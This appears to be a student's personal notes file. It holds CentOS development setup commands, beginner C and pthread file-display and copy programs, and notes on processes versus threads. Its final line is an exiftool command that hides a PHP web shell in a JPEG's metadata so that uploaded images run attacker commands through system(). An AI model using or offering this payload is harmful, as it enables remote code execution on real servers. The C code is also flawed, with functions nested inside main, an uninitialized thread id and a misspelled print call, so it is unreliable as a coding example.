install centos
clear			// To clear everything
yum clean all		// To check if yum working
yum update all		// To update in centos if any of update available
yum group list		// To check if development tool already installed
yum group list ids	// To list all pre installed tools
yum group install "Development Tools" // To install all development tools
whereis gcc		// To locate path of gcc
gcc --version		// To check version of gcc
pwd			// To identify current location
cd Desktop		// To set current path to Desktop
vim foo.c		// To create/edit file with name foo
:wq!			// To save file

Program for example in foo.c file:
#include<stdio.h>
int main(void){
	print("Hello World");
}

cc foo.c -o foo		// To compile foo.c file
./foo			// To run compiled file

updated file

#include<stdio.h>
#include<string.h>
int main()
{
    int I;
	FILE * fPtr;
	FILE * fp; //file write
	int i;
	char ch;
	char status[30];
				
    do
    {
        puts("Enter exit to quit \n OR 'monitor-dc' OR 'monitor-dm' OR 'monitor-rs' to read file and show on monitor, \n OR 'copy-dc' OR 'copy-dm' OR 'copy-rs' to copy to file, \n OR 'both-dc' OR 'both-dm' OR 'both-rs' to copy to file");
        printf("Enter your choice: ");
        scanf("%s",&status);
		if(strcmp(status, "exit") == 0){
			I = -1;
		}
		else if(strcmp(status, "monitor-dc") == 0){
			I = 1;
		}
		else if(strcmp(status, "monitor-dm") == 0){
			I = 2;
		}
		else if(strcmp(status, "monitor-rs") == 0){
			I = 3;
		}
		else if(strcmp(status, "copy-dc") == 0){
			I = 4;
		}
		else if(strcmp(status, "copy-dm") == 0){
			I = 5;
		}
		else if(strcmp(status, "copy-rs") == 0){
			I = 6;
		}
		else if(strcmp(status, "both-dc") == 0){
			I = 7;
		}
		else if(strcmp(status, "both-dm") == 0){
			I = 8;
		}
		else if(strcmp(status, "both-rs") == 0){
			I = 9;
		}
		else{
			I = 0;
		}
		
        switch(I)
        {
            case 1:
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen("config0.cnf", "r");


			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Config File Display \n");
			printf("------------------- \n\n");

			do 
			{
				/* Read single character from file */
				ch = fgetc(fPtr);

				/* Print character read on console */
				putchar(ch);

			} while(ch != EOF); /* Repeat this if last read character is not EOF */


			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n\n Simulator Program End.\n\n\n");
            break;
            case -1:
            puts("Bye");
            break;
			case 2:
                /* 
				 * Open file in r (read) mode. 
				 * "data/file1.txt" is complete file path to read
				 */
				fPtr = fopen("metadata_0.mdf", "r");


				/* fopen() return NULL if last operation was unsuccessful */
				if(fPtr == NULL)
				{
					/* Unable to open file hence exit */
					printf("Unable to open file.\n");
					printf("Please check whether file exists and you have read privilege.\n");
					//exit(EXIT_FAILURE);
				}


				/* File open success message */
				printf("Simulator Program \n");
				printf("================= \n\n");
				printf("Meta-Data File Display \n");
				printf("------------------- \n\n");

				do 
				{
					/* Read single character from file */
					ch = fgetc(fPtr);

					/* Print character read on console */
					putchar(ch);

				} while(ch != EOF); /* Repeat this if last read character is not EOF */


				/* Done with this file, close file to release resource */
				fclose(fPtr);
				printf("\n\n Simulator Program End.\n");
            break;
			case 3:
                /* 
				 * Open file in r (read) mode. 
				 * "data/file1.txt" is complete file path to read
				 */
				fPtr = fopen("runsimulator_0.cnf", "r");


				/* fopen() return NULL if last operation was unsuccessful */
				if(fPtr == NULL)
				{
					/* Unable to open file hence exit */
					printf("Unable to open file.\n");
					printf("Please check whether file exists and you have read privilege.\n");
					//exit(EXIT_FAILURE);
				}


				/* File open success message */
				printf("Simulator Program \n");
				printf("================= \n\n");
				printf("runSim called here \n");
				printf("------------------- \n\n");

				do 
				{
					/* Read single character from file */
					ch = fgetc(fPtr);

					/* Print character read on console */
					putchar(ch);

				} while(ch != EOF); /* Repeat this if last read character is not EOF */


				/* Done with this file, close file to release resource */
				fclose(fPtr);
				printf("\n\n Simulator Program End.\n");
            break;
			case 4:
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen("config0.cnf", "r");
			fp = fopen ("copy/config0_copy.txt","w");

			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Config File Copy Only \n");
			printf("------------------- \n\n");

			

			do 
			{
				  /* Read single character from file */
				  ch = fgetc(fPtr);
				
				   /* open the file for writing*/
				  fputc(ch, fp);	
				  

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			fclose (fp);
			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n\n Simulator Program End.\n\n\n");
			break;
			case 5:
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen("metadata_0.mdf", "r");
			fp = fopen ("metadata_0_copy.txt","w");

			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Metadata File Copy Only \n");
			printf("------------------- \n\n");

			

			do 
			{
				  /* Read single character from file */
				  ch = fgetc(fPtr);
				
				   /* open the file for writing*/
				  fputc(ch, fp);	
				  
				

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			fclose (fp);
			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n\n Simulator Program End.\n\n\n");
			break;
			case 6:
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen("runsimulator_0.mdf", "r");
			fp = fopen ("runsimulator_0_copy.txt","w");

			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Simulator File Copy Display \n");
			printf("------------------- \n\n");

			

			do 
			{
				  /* Read single character from file */
				  ch = fgetc(fPtr);
				
				   /* open the file for writing*/
				  fputc(ch, fp);	
				  
				   
				   /* Print character read on console */
				   putchar(ch);
				

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			fclose (fp);
			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n\n Simulator Program End.\n\n\n");
			break;
			case 7:
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen("config0.cnf", "r");
			fp = fopen ("copy/config0_copy.txt","w");

			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Config File Copy and Display \n");
			printf("------------------- \n\n");

			

			do 
			{
				  /* Read single character from file */
				  ch = fgetc(fPtr);
				
				   /* open the file for writing*/
				  fputc(ch, fp);	
				  
				   
				   /* Print character read on console */
				   putchar(ch);
				

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			fclose (fp);
			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n\n Simulator Program End.\n\n\n");
			break;
			case 8:
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen("metadata_0.mdf", "r");
			fp = fopen ("metadata_0_copy.txt","w");

			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Metadata File Copy and Display \n");
			printf("------------------- \n\n");

			

			do 
			{
				  /* Read single character from file */
				  ch = fgetc(fPtr);
				
				   /* open the file for writing*/
				  fputc(ch, fp);	
				  
				   
				   /* Print character read on console */
				   putchar(ch);
				

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			fclose (fp);
			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n\n Simulator Program End.\n\n\n");
			break;
			case 9:
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen("runsimulator_0.mdf", "r");
			fp = fopen ("runsimulator_0_copy.txt","w");

			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Simulator File Copy and Display \n");
			printf("------------------- \n\n");

			

			do 
			{
				  /* Read single character from file */
				  ch = fgetc(fPtr);
				
				   /* open the file for writing*/
				  fputc(ch, fp);	
				  
				   
				   /* Print character read on console */
				   putchar(ch);
				

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			fclose (fp);
			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n\n Simulator Program End.\n\n\n");
			break;
            default:
            printf("Select from given options \n\n\n");
			break;
        }
    }while(I != -1);
    return 0;
}



#include <stdio.h>
#define LEN 256
int main ()
{
   FILE * fp;
   int i;
   /* open the file for writing*/
   fp = fopen ("1.txt","w");
 
   /* write 10 lines of text into the file stream*/
   for(i = 0; i < 10;i++){
       fprintf (fp, "This is line %d\n",i + 1);
   }
 
   /* close the file*/  
   fclose (fp);
   return 0;
}


https://computing.llnl.gov/tutorials/pthreads/#Abstract
For Linux the correct command is:

gcc -o exefilename filename.c -lpthread

for https://computing.llnl.gov/tutorials/pthreads/samples/join.c 
include ‘<math.h>’
gcc -o test test.c -lpthread -lm

----------------------------------------------------------------------------------------------------------------------------------------------------------
#include<string.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#define NUM_THREADS	5
//new
//ready
//running
//exiting
int main()
{
    int I;
	FILE * fPtr;
	FILE * fp; //file write
	int i;
	char ch;
	char status[30];
	
	pthread_t threads[NUM_THREADS];
	pthread_attr_t attr;
   	int rc;
	long t;

	/* Initialize and set thread detached attribute */
	   pthread_attr_init(&attr);
	   pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);

void *PrintHello(void *t){
			int i;
			long tid;
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			printf("\n\n\n\n Thread %ld ready to start...\n\n",tid);
			fPtr = fopen("config0.cnf", "r");


			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n\n");
			printf("Config File Display \n");
			printf("------------------- \n\n");
			printf("Thread %ld running...\n",tid);
			do 
			{
				/* Read single character from file */
				ch = fgetc(fPtr);

				/* Print character read on console */
				putchar(ch);

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			

			/* Done with this file, close file to release resource */
			fclose(fPtr);
			
			
			printf("\n\n\n\n Thread %ld exiting \n\n\n",tid);
  			pthread_exit((void*) t);
			
			
}

    do
    {
    puts("Enter exit to quit \n OR 'monitor-dc'");
        printf("Enter your choice: ");
        scanf("%s",&status);
		if(strcmp(status, "exit") == 0){
			I = -1;
		}
		else if(strcmp(status, "monitor-dc") == 0){
		   t = 0;
		   printf("In main: creating new thread for monitor-dc %ld\n", t);
		   I = 1;
		   
			rc = pthread_create(&threads[t], &attr, PrintHello, (void *)t);
		     if (rc){
		       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
    }
    while(I != -1);
printf("Main: program completed. Exiting.\n");
pthread_exit(NULL);
    return 0;
}

gcc -o test test.c -lpthread
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
mian file:
	To Monitor
	To File (without monitor)
	Both
	
States:
	new
	ready
	running
	exiting
	

Process include 
	Fork()				//Create child process copy
		Data/Files		//copy created
		Code			//copy created
		Stack			//copy created
		Register		//copy created
		
1. System calls involved in process
2. OS treats different process differently
3. Different process have different copies of Data, Files, code	
4. Content switching is slower
5. Blocking a process will not block another process
6. Independent
		
Thread Include
	Data/File 			//No copy created
	Code				//No copy created
	Stack				//copy created
	Register			//copy created

1. There is no system call involved/ User/Application level involvement not kernel involvement
2. All user level threads treated as single task/process for OS 
3. Threads share some copy of code and data
4. Context switching is faster
5. Blocking a thread will block entire process 
6. Interdependent


#include<string.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#define NUM_THREADS	5
//new
//ready
//running
//exiting
int main()
{
    int I;
	FILE * fPtr;
	FILE * fp; //file write
	int i;
	char ch;
	char status[30];
	
	pthread_t threads[NUM_THREADS];
	pthread_attr_t attr;
   	int rc;
	long t;

	/* Initialize and set thread detached attribute */
	   pthread_attr_init(&attr);
	   pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);

		void *PrintOnMonitor(void *t){
			
			int i;
			long tid;
			char *filename;

			if((I==1) || (I==7) ){
				filename = "config0.cnf";
			}
			else if((I==2) || (I==8)){
				filename = "metadata_0.mdf";
			}
			else if((I==3) || (I==9)){
				filename = "runsimulator_0.cnf";
			}
			
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			printf("\n ************ Thread %ld ready to start ************ \n",tid);
			fPtr = fopen(filename, "r");


			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n");
			if(I==1){
				printf("Config File Display \n");
			}
			else if(I==2){
				printf("Meta Data File Display \n");
			}
			else if(I==3){
				printf("Runsim File Display \n");
			}
			printf("------------------- \n");
			printf("\n ************ Thread %ld running ************ \n",tid);
			do 
			{
				/* Read single character from file */
				ch = fgetc(fPtr);

				/* Print character read on console */
				putchar(ch);

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			

			/* Done with this file, close file to release resource */
			fclose(fPtr);
			
			
			printf("\n ************ Thread %ld exiting ************ \n",tid);
  			pthread_exit((void*) t);
			
			
		}
		void *CopyInFile(void *t){
			
			int i;
			long tid;
			char *filename;

			if((I==4) || (I==7)){
				filename = "config0.cnf";
			}
			else if((I==5) || (I==8)){
				filename = "metadata_0.mdf";
			}
			else if((I==6) || (I==9)){
				filename = "runsimulator_0.cnf";
			}
			
			printf("\n ************ Thread %ld ready to start ************ \n",tid);
			/* 
			 * Open file in r (read) mode. 
			 * "data/file1.txt" is complete file path to read
			 */
			fPtr = fopen(filename, "r");
			fp = fopen ("copy/config0_copy.txt","w");

			/* fopen() return NULL if last operation was unsuccessful */
			if(fPtr == NULL)
			{
				/* Unable to open file hence exit */
				printf("Unable to open file.\n");
				printf("Please check whether file exists and you have read privilege.\n");
				//exit(EXIT_FAILURE);
			}


			/* File open success message */
			printf("Simulator Program \n");
			printf("================= \n");
			printf("Config File Copy Only \n");
			printf("------------------- \n");
			printf("\n ************ Thread %ld running ************ \n",tid);
			

			do 
			{
				  /* Read single character from file */
				  ch = fgetc(fPtr);
				
				   /* open the file for writing*/
				  fputc(ch, fp);	
				  

			} while(ch != EOF); /* Repeat this if last read character is not EOF */

			fclose (fp);
			/* Done with this file, close file to release resource */
			fclose(fPtr);
			printf("\n Simulator Program End.\n");
			
			
			printf("\n ************ Thread %ld exiting ************ \n",tid);
  			pthread_exit((void*) t);
			
			
		}

    do
    {
    puts(" \n Enter your choice: \n\t To print on Monitor \n\t\t * '-dc' for config0.cnf \n\t\t * '-dm' for metadata_0.mdf \n\t\t * '-dr' for runsimulator_0.cnf \n\t To copy in Background \n\t\t * '-dc-bg' for config0.cnf \n\t\t * '-dm-bg' for metadata_0.mdf \n\t\t * '-dr-bg' for runsimulator_0.cnf \n\t To print on Monitor and copy in file \n\t\t * '-dc-both' for config0.cnf \n\t\t * '-dm-both' for metadata_0.mdf \n\t\t * '-dr-both' for runsimulator_0.cnf \n\t To quit enter 'exit' \n\t");
        
        scanf("%s",&status);
		if(strcmp(status, "exit") == 0){
			I = -1;
		}
		else if(strcmp(status, "-dc") == 0){
		   I = 1;
		   printf("\n ************ Creating new thread for -dc %ld ************ \n", t);
		   
			rc = pthread_create(&threads[t], &attr, PrintOnMonitor, (void *)t);
		     if (rc){
		       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dm") == 0){
		   I = 2;
		   printf("In main: creating new thread  %ld\n", t);
		   
			rc = pthread_create(&threads[t], &attr, PrintOnMonitor, (void *)t);
		     if (rc){
		       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dr") == 0){
		   I = 3;
		   printf("In main: creating new thread  %ld\n", t);
		   
			rc = pthread_create(&threads[t], &attr, PrintOnMonitor, (void *)t);
		     if (rc){
		       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dc-bg") == 0){
		   I = 4;
		   printf("In main: creating new thread  %ld\n", t);
		   
			rc = pthread_create(&threads[t], &attr, CopyInFile, (void *)t);
		     if (rc){
		       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dm-bg") == 0){
			   I = 5;
			   printf("In main: creating new thread  %ld\n", t);
			   
				rc = pthread_create(&threads[t], &attr, CopyInFile, (void *)t);
			     if (rc){
			       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dr-bg") == 0){
			   I = 6;
			   printf("In main: creating new thread  %ld\n", t);
			   
				rc = pthread_create(&threads[t], &attr, CopyInFile, (void *)t);
			     if (rc){
			       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dc-both") == 0){
			   I = 7;
			   printf("In main: creating new thread  %ld\n", t);
			   t = 0;
			   	rc = pthread_create(&threads[t], &attr, PrintOnMonitor, (void *)t);
			   t = 1;
				rc = pthread_create(&threads[t], &attr, CopyInFile, (void *)t);
			     if (rc){
			       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dm-both") == 0){
			   I = 8;
			   printf("In main: creating new thread  %ld\n", t);
			   t = 0;
			   	rc = pthread_create(&threads[t], &attr, PrintOnMonitor, (void *)t);
			   t = 1;
				rc = pthread_create(&threads[t], &attr, CopyInFile, (void *)t);
			     if (rc){
			       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else if(strcmp(status, "-dr-both") == 0){
			   I = 9;
			   printf("In main: creating new thread %ld\n", t);
			   t = 0;
			   	rc = pthread_create(&threads[t], &attr, PrintOnMonitor, (void *)t);
			   t = 1;
				rc = pthread_create(&threads[t], &attr, CopyInFile, (void *)t);
			     if (rc){
			       printf("ERROR; return code from pthread_create() is %d\n", rc);
		       exit(-1);
		       }
		}
		else{
			I = 0;
		}
    }
    while(I != -1);
printf("Main: program completed. Exiting.\n");
pthread_exit(NULL);
    return 0;
}


//Install ssh
https://linuxconfig.org/install-ssh-server-on-redhat-8


exiftool.exe -DocumentName="<h1>RAZZOR<br><?php if(isset($_REQUEST['cmd'])){echo '<pre>';$cmd = ($_REQUEST['cmd']);system($cmd);echo '</pre>';} __halt_compiler();?></h1>" C:\Users\user\Downloads\exiftool-12.06\download.jpg

